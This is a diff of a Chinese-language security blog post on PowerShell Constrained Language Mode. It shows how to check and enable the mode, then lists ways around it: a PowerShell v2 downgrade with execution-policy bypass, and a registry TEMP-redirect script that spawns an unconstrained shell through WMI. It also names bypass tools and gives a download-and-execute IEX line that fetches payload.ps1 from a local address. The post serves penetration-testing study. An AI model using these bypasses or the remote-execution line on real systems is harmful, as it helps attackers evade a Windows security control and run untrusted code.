@@ -290,31 +290,40 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="CLM"><a href="#CLM" class="headerlink" title="CLM"></a>CLM</h3><p>PowerShell Constrained Language Mode<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2">受限语言模式</a>是缓解PowerShell攻击的一种方式，能够阻止执行任意未签名的代码</p>
+        <h3 id="clm">CLM</h3>
+<p>PowerShell Constrained Language Mode<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.2">受限语言模式</a>是缓解PowerShell攻击的一种方式，能够阻止执行任意未签名的代码</p>
 <p>查询</p>
 <p><code>$ExecutionContext.SessionState.LanguageMode</code></p>
 <p>在本地查询结果为<code>FullLanguage</code> 即未开启状态</p>
 <p>开启CLM</p>
-<p><code>$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;</code></p>
-<p>测试语句 </p>
-<p>IEX (New-Object Net.WebClient).DownloadString.(‘<a target="_blank" rel="noopener" href="http://192.168.0.133:8000/payload.ps1&#39;">http://192.168.0.133:8000/payload.ps1&#39;</a>)</p>
+<p><code>$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"</code></p>
+<p>测试语句</p>
+<p>IEX (New-Object
+Net.WebClient).DownloadString.('http://192.168.0.133:8000/payload.ps1')</p>
 <p>开启后会对此命令进行拦截</p>
 <p><img src="/posts/39eca96/1.png"></p>
-<h3 id="CLM-Bypass"><a href="#CLM-Bypass" class="headerlink" title="CLM Bypass"></a>CLM Bypass</h3><h4 id="Powershell降级"><a href="#Powershell降级" class="headerlink" title="Powershell降级"></a>Powershell降级</h4><p><code>powershell.exe -version 2</code></p>
+<h3 id="clm-bypass">CLM Bypass</h3>
+<h4 id="powershell降级">Powershell降级</h4>
+<p><code>powershell.exe -version 2</code></p>
 <p><code>powershell.exe -version 2 -ExecutionPolicy bypass</code></p>
-<h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p><code> &amp;&#123; whoami &#125;</code></p>
-<h4 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h4><p>这里直接照搬国外大佬(<a target="_blank" rel="noopener" href="https://sp00ks-git.github.io/posts/CLM-Bypass/)%E7%9A%84%E4%B8%80%E4%B8%AApowershell%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E5%90%8E%E4%BC%9A%E6%B4%BE%E7%94%9F%E5%87%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%9A%84powershell(%E8%BF%99%E4%B8%AA%E7%89%88%E6%9C%AC%E5%8F%AF%E4%BB%A5%E6%A0%B9%E6%8D%AE%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8C%E6%9B%B4%E6%94%B9)">https://sp00ks-git.github.io/posts/CLM-Bypass/)的一个powershell命令，执行后会派生出一个新的powershell(这个版本可以根据命令进行更改)</a></p>
+<h4 id="内联注释">内联注释</h4>
+<p><code>&amp;&#123; whoami &#125;</code></p>
+<h4 id="powershell">Powershell</h4>
+<p>这里直接照搬国外大佬(https://sp00ks-git.github.io/posts/CLM-Bypass/)的一个powershell命令，执行后会派生出一个新的powershell(这个版本可以根据命令进行更改)</p>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$CurrTemp</span> = <span class="variable">$env:temp</span></span><br><span class="line"><span class="variable">$CurrTmp</span> = <span class="variable">$env:tmp</span></span><br><span class="line"><span class="variable">$TEMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"><span class="variable">$TMPBypassPath</span> = <span class="string">&quot;C:\windows\temp&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TEMPBypassPath</span>&quot;</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$TMPBypassPath</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-WmiMethod</span> <span class="literal">-Class</span> win32_process <span class="literal">-Name</span> create <span class="literal">-ArgumentList</span> <span class="string">&quot;Powershell.exe&quot;</span> </span><br><span class="line"><span class="comment">#这里可以添加版本之类的参数</span></span><br><span class="line"><span class="comment">#Invoke-WmiMethod -Class win32_process -Name create -ArgumentList &quot;Powershell.exe -Version 2 -ExecutionPolicy bypass&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sleep</span> <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Set it back</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Tmp <span class="literal">-Value</span> <span class="variable">$CurrTmp</span></span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&#x27;hkcu:\Environment&#x27;</span> <span class="literal">-Name</span> Temp <span class="literal">-Value</span> <span class="variable">$CurrTemp</span></span><br></pre></td></tr></table></figure>
-
 <p>也可以对以上命令进行混淆</p>
-<h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><blockquote>
-<p><a target="_blank" rel="noopener" href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a><br><a target="_blank" rel="noopener" href="https://github.com/p3nt4/PowerShdll">https://github.com/p3nt4/PowerShdll</a><br><a target="_blank" rel="noopener" href="https://github.com/iomoath/PowerShx">https://github.com/iomoath/PowerShx</a></p>
+<h4 id="工具">工具</h4>
+<blockquote>
+<p>https://github.com/calebstewart/bypass-clm
+https://github.com/p3nt4/PowerShdll
+https://github.com/iomoath/PowerShx</p>
 </blockquote>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><blockquote>
-<p><a target="_blank" rel="noopener" href="https://sp00ks-git.github.io/posts/CLM-Bypass/">https://sp00ks-git.github.io/posts/CLM-Bypass/</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/calebstewart/bypass-clm">https://github.com/calebstewart/bypass-clm</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass">https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass</a></p>
+<h3 id="references">References</h3>
+<blockquote>
+<p>https://sp00ks-git.github.io/posts/CLM-Bypass/</p>
+<p>https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</p>
+<p>https://github.com/calebstewart/bypass-clm</p>
+<p>https://blog.0x4.xyz/bypassing-windows-protection-mechanisms/constrained-language-mode-bypass</p>
 </blockquote>
 
     </div>
@@ -441,7 +450,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#CLM"><span class="nav-number">1.</span> <span class="nav-text">CLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CLM-Bypass"><span class="nav-number">2.</span> <span class="nav-text">CLM Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell%E9%99%8D%E7%BA%A7"><span class="nav-number">2.1.</span> <span class="nav-text">Powershell降级</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">2.2.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Powershell"><span class="nav-number">2.3.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.4.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">3.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#clm"><span class="nav-number">1.</span> <span class="nav-text">CLM</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#clm-bypass"><span class="nav-number">2.</span> <span class="nav-text">CLM Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell%E9%99%8D%E7%BA%A7"><span class="nav-number">2.1.</span> <span class="nav-text">Powershell降级</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A"><span class="nav-number">2.2.</span> <span class="nav-text">内联注释</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#powershell"><span class="nav-number">2.3.</span> <span class="nav-text">Powershell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A5%E5%85%B7"><span class="nav-number">2.4.</span> <span class="nav-text">工具</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#references"><span class="nav-number">3.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -457,7 +466,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -505,7 +514,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -519,7 +528,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -530,7 +539,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -670,6 +679,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
